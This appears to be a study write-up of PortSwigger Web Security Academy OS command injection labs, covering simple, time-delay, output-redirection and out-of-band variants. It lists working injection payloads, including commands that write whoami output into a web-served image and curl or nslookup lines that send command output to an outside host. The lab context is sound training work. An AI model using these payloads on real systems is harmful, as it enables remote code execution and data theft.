# OS COmmand Injection

- https://portswigger.net/web-security/os-command-injection

## OS command injection, simple case

At `POST /product/stock` request modyfing a `stockId` param allows us to perform RCE and see the output(request must be URL encoded):

```
productId=2&storeId=1 && echo test
```

Response:

```
32
test
```

Payload solved the lab:

```
productId=2&storeId=1 && whoami
```

## Blind OS command injection with time delays

Assuming Submit Feedback option uses `mail` command, we can try to inject functions causing delays.

Adding `$(sleep 10)` or `$(ping -c 10 127.0.0.1)` to the mail message solved the lab.

This works because the `"` is used to create a string. In `'` marks commandd would not be executed and would require their termination beforehand.

## Blind OS command injection with output redirection

Same history regarding submit feedback functionality.

Making use of that the website serves static files, we can output file content into one of them and read it.

Running on OS command `ls /test && sleep 3` creates a delay when the file is present and return with error imidiately if it is not.

With this it is possible to find that `/var/www/images/` is the path for images (`22.jpg` image was listed in the website):

```
message=message $(ls /var/www/images/22.jpg && sleep 3)
```

Then with this payload we can store the output of a command to an `"image"`:

message=message $(whoami > /var/www/images/tmp.jpg)

And retrieve its content:

```
curl https://0af8000b03830b5d832ff27200c60040.web-security-academy.net/image?filename=tmp.jpg
```

## Blind OS command injection with out-of-band interaction
## Blind OS command injection with out-of-band data exfiltration

Both requires Burp collaborator, but can be done by injecting something like:

```
$(curl https://aaaaaa.free.beeceptor.com/?q=$(whoami))
```

or (beeceptor is not a tool for this, but for demonstration purposes)

```
$(nslookup $(whoami).aaaaaa.free.beeceptor.com)
```